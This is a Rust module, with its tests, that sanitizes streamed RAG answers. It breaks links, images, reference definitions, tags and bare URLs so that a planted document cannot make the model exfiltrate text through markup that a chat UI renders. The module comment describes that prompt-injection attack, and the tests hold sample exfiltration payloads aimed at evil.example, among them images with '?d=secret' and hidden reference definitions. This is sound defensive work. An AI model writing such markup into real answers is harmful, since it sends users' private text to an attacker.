//! The answer as it leaves roll: model output is untrusted, and a planted document can make the
//! model write markup that a chat UI loads or links (`![.](https://evil.example/p?d=<other
//! sources>)`, or a reference definition and `![x][a]`), sending text the reader may read to
//! someone else. So every answer, streamed or whole, native or OpenAI's, goes through
//! [`Sanitizer`], which breaks that markup wherever it stands, without following CommonMark's
//! line or container rules (a definition counts inside a block quote or a list item, its label may
//! span lines or hold `\]`), and without removing anything (the reader still sees the text):
//!
//! - every `](` becomes `]\(`, so no inline link or image renders, and their URLs code spans;
//! - every `]:` becomes `]\:`, so no reference definition (nor footnote) exists, and a reference
//!   link or image (`[x][a]`, `![x][a]`) has nothing to point at;
//! - a `<` that starts a tag or an autolink becomes `&lt;`, which no backslash can cancel;
//! - a bare URL (`http://`, `https://`, `ftp://`, `www.`, and protocol-relative `//host…`) becomes
//!   a code span, which renders as text and is never linked or fetched;
//! - `\r` and `\r\n` become `\n` first, so every renderer sees the same lines.
//!
//! A profile with `allow_links` keeps inline links (never images) whose URL is exactly one in the
//! given sources' fields, and a bare such URL only when whitespace or the answer's end follows it
//! (GFM's autolinks run on to the next space). While streaming, text that could still become one
//! of these is held back until it settles: a trailing `]`, `<` or `\`, a trailing word that is or
//! may become a URL, and an open `[…](…`. At most [`MAX_HOLD`] bytes are held; past it they're
//! released, a trailing `]`, `<` or `\` as its entity.
//!
//! What this doesn't do (docs/search/rag.md): kept links carry no `rel` or `referrerpolicy`
//! (that's the renderer's); code the model writes in a fence is escaped like any text; and a
//! renderer that links bare domains (markdown-it's fuzzy linkify) can still link `example.com`.

use regex::Regex;
use std::sync::OnceLock;

/// The most bytes held back.
pub const MAX_HOLD: usize = 2048;

/// Breaks links, images, definitions, autolinks, tags and bare URLs in an answer as it streams.
pub struct Sanitizer {
    held: String,
    /// URLs a link may keep (`allow_links`: the sources' own); `None`: no links at all.
    allowed: Option<Vec<String>>,
    /// The last text fed ended with `\r`: a `\n` starting the next is the same line ending.
    after_cr: bool,
}

fn markup() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(concat!(
            r"(?P<link>(?P<bang>!)?\[(?P<text>[^\[\]\n]*)\]\((?P<url>[^()\s]*)\))",
            r"|(?P<close>\]\()",
            r"|(?P<defn>\]:)",
            r"|(?P<auto><(?P<aurl>(?i:https?://|ftp://|www\.|//)[^\s<>`]*)(?P<gt>>)?)",
            r"|(?P<tag><[A-Za-z/!?])",
            r"|(?P<bare>(?i:https?://|ftp://|www\.)[^\s<>`)\]]+|//[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+[^\s<>`)\]]*)",
        ))
        .expect("the markup pattern")
    })
}

/// `s` as a code span (backticks inside it dropped).
fn code(s: &str) -> String {
    let s: String = s.chars().filter(|c| *c != '`').collect();
    if s.is_empty() { String::new() } else { format!("`{s}`") }
}

/// Whether a trailing word is, or may still become, a URL.
fn url_ahead(word: &str) -> bool {
    let w = word.trim_start_matches(|c: char| "([{<\"'*_~".contains(c)).to_ascii_lowercase();
    if w.is_empty() {
        return false;
    }
    w.contains("://") || w.starts_with("www.") || w.starts_with('/') || ["https://", "http://", "ftp://", "www."].iter().any(|p| p.starts_with(w.as_str()))
}

impl Sanitizer {
    pub fn new(allowed: Option<Vec<String>>) -> Sanitizer {
        Sanitizer { held: String::new(), allowed, after_cr: false }
    }

    /// `text` with `\r\n` and `\r` as `\n` (a `\r\n` split across two pieces too).
    fn lines(&mut self, text: &str) -> String {
        let mut out = String::with_capacity(text.len());
        let mut chars = text.chars().peekable();
        if self.after_cr && chars.peek() == Some(&'\n') {
            chars.next();
        }
        while let Some(c) = chars.next() {
            if c == '\r' {
                out.push('\n');
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
            } else {
                out.push(c);
            }
        }
        if !text.is_empty() {
            self.after_cr = text.ends_with('\r');
        }
        out
    }

    /// Takes `text` and answers what can be released now.
    pub fn feed(&mut self, text: &str) -> String {
        let text = self.lines(text);
        self.held.push_str(&text);
        let mut cut = self.hold_from();
        let forced = self.held.len() - cut > MAX_HOLD;
        if forced {
            cut = self.held.len();
        }
        let out: String = self.held.drain(..cut).collect();
        self.release(&out, forced)
    }

    /// Releases what's held (the answer ended: nothing can complete it).
    pub fn finish(&mut self) -> String {
        let out = std::mem::take(&mut self.held);
        self.release(&out, false)
    }

    /// Where the held text must start: the earliest point after which it may still change.
    fn hold_from(&self) -> usize {
        let b = &self.held;
        let mut cut = b.len();
        if b.ends_with(']') || b.ends_with('<') || b.ends_with('\\') {
            cut = b.len() - 1;
        }
        let ws = b.char_indices().rev().find(|(_, c)| c.is_whitespace()).map_or(0, |(i, c)| i + c.len_utf8());
        if url_ahead(&b[ws..]) {
            cut = cut.min(ws);
        }
        // An open `[…` or `[…](…`: released whole, as one link.
        if let Some(p) = b.rfind('[') {
            let rest = &b[p..];
            let open = match rest.find("](") {
                None => !rest.contains(']'),
                Some(i) => !rest[i..].contains(')'),
            };
            if open {
                cut = cut.min(p);
            }
        }
        cut
    }

    /// `text` with its markup broken (`forced`: released past [`MAX_HOLD`] while more may come,
    /// so its last character can't start a construct with what follows).
    fn release(&mut self, text: &str, forced: bool) -> String {
        if text.is_empty() {
            return String::new();
        }
        let allowed = self.allowed.as_deref();
        let is_allowed = |u: &str| allowed.is_some_and(|a| a.iter().any(|x| x == u));
        let mut out = markup()
            .replace_all(text, |c: &regex::Captures| {
                if c.name("link").is_some() {
                    let url = c.name("url").map_or("", |m| m.as_str());
                    if c.name("bang").is_none() && is_allowed(url) {
                        return c[0].to_string();
                    }
                    let bang = if c.name("bang").is_some() { "!" } else { "" };
                    let label = c.name("text").map_or("", |m| m.as_str());
                    return format!("{bang}[{label}]\\({})", code(url));
                }
                if c.name("close").is_some() {
                    return "]\\(".to_string();
                }
                if c.name("defn").is_some() {
                    return "]\\:".to_string();
                }
                if let Some(u) = c.name("aurl") {
                    let gt = if c.name("gt").is_some() { ">" } else { "" };
                    return format!("&lt;{}{gt}", code(u.as_str()));
                }
                if let Some(t) = c.name("tag") {
                    return format!("&lt;{}", &t.as_str()[1..]);
                }
                let m = c.name("bare").expect("the last alternative");
                // A kept URL ends at whitespace or the end: anything else would extend GFM's
                // autolink past it.
                let next = text[m.end()..].chars().next();
                let ends = next.is_some_and(char::is_whitespace) || (next.is_none() && !forced);
                if ends && is_allowed(m.as_str()) {
                    return m.as_str().to_string();
                }
                code(m.as_str())
            })
            .into_owned();
        if forced {
            let entity = match out.chars().last() {
                Some(']') => Some("&#93;"),
                Some('<') => Some("&lt;"),
                Some('\\') => Some("&#92;"),
                _ => None,
            };
            if let Some(e) = entity {
                out.pop();
                out.push_str(e);
            }
        }
        out
    }
}

/// An answer's text, whole, sanitized.
pub fn sanitize(text: &str, allowed: Option<Vec<String>>) -> String {
    let mut s = Sanitizer::new(allowed);
    let mut out = s.feed(text);
    out.push_str(&s.finish());
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use comrak::nodes::NodeValue;

    /// `out` rendered as GitHub-flavored markdown (extended autolinks, footnotes, tables) holds no
    /// image, no HTML, no link but to `allowed`, and no text a renderer could link (a URL, a
    /// protocol-relative `//host`).
    fn inert(out: &str, allowed: &[&str]) {
        let mut o = comrak::Options::default();
        o.extension.autolink = true;
        o.extension.footnotes = true;
        o.extension.table = true;
        o.extension.strikethrough = true;
        o.extension.tasklist = true;
        let arena = comrak::Arena::new();
        let root = comrak::parse_document(&arena, out, &o);
        let bare = Regex::new(r"(?i)https?://|ftp://|www\.|//[a-z0-9-]+\.[a-z]").unwrap();
        for n in root.descendants() {
            match &n.data().value {
                NodeValue::Link(l) => assert!(allowed.contains(&l.url.as_str()), "a link to {} in {out:?}", l.url),
                NodeValue::Image(l) => panic!("an image of {} in {out:?}", l.url),
                NodeValue::HtmlInline(h) => panic!("inline HTML {h:?} in {out:?}"),
                NodeValue::HtmlBlock(h) => panic!("an HTML block {:?} in {out:?}", h.literal),
                NodeValue::Text(t) => assert!(!bare.is_match(t) || allowed.iter().any(|a| t.contains(a)), "linkable text {t:?} in {out:?}"),
                _ => {}
            }
        }
    }

    #[test]
    fn planted_images_and_links_are_broken_however_the_stream_splits_them() {
        let answer = concat!(
            "Reset it in Settings [1].\n![.](https://evil.example/p?d=secret) and [click](https://evil.example/q) <https://evil.example/a> <img src=x>\n",
            "[r]: https://evil.example/r\nsee https://evil.example/b [2]\n\n",
            // A definition in a block quote and in a list item, used by images below.
            "> [a]: //evil.example/p?d=1\n\n![x][a]\n\n- [b]: //evil.example/q\n\n![y][b]\n\n",
            // A label over two lines, and one holding an escaped bracket.
            "[\nfoo\n]: //evil.example/f\n\n![x][foo]\n\n[a\\]b]: //evil.example/e\n\n![x][a\\]b]\n\n",
            // Bare carriage returns as line endings.
            "ok\r[c]: //evil.example/r\r\r![x][c]\r\r",
            // A backslash the model wrote before a tag.
            "\\<img src=//evil.example/i>\n",
        );
        let whole = sanitize(answer, None);
        inert(&whole, &[]);
        assert!(whole.starts_with("Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`) and [click]\\(`https://evil.example/q`) &lt;`https://evil.example/a`> &lt;img src=x>\n[r]\\: `https://evil.example/r`"), "{whole}");
        // However the stream splits it, the same answer.
        for at in 1..answer.len() {
            if !answer.is_char_boundary(at) {
                continue;
            }
            let mut s = Sanitizer::new(None);
            let mut out = s.feed(&answer[..at]);
            out.push_str(&s.feed(&answer[at..]));
            out.push_str(&s.finish());
            assert_eq!(out, whole, "split at {at}");
        }
        // allow_links keeps a link to a source's own URL, never an image, and a bare one only when
        // nothing runs on after it.
        let ok = vec!["https://help.acme.test/pw".to_string()];
        let out = sanitize("[Reset](https://help.acme.test/pw) ![x](https://help.acme.test/pw) [y](https://evil.example) https://help.acme.test/pw)d=secret https://help.acme.test/pw", Some(ok));
        assert_eq!(
            out,
            "[Reset](https://help.acme.test/pw) ![x]\\(`https://help.acme.test/pw`) [y]\\(`https://evil.example`) `https://help.acme.test/pw`)d=secret https://help.acme.test/pw"
        );
        inert(&out, &["https://help.acme.test/pw"]);
    }

    #[test]
    fn holding_back_is_bounded() {
        let mut s = Sanitizer::new(None);
        let out = s.feed(&format!("https://evil.example/{}", "a".repeat(MAX_HOLD + 10)));
        assert!(out.starts_with("`https://evil.example/") && out.ends_with('`'), "{}", &out[..40]);
        assert_eq!(s.finish(), "");
        // Released by force, a last `]`, `<` or `\` can't join what follows.
        let mut s = Sanitizer::new(None);
        let out = s.feed(&format!("[x https://evil.example/{}]", "a".repeat(MAX_HOLD + 10)));
        assert!(out.ends_with("`&#93;"), "{}", &out[out.len() - 10..]);
        inert(&format!("{out}(x)"), &[]);
    }
}
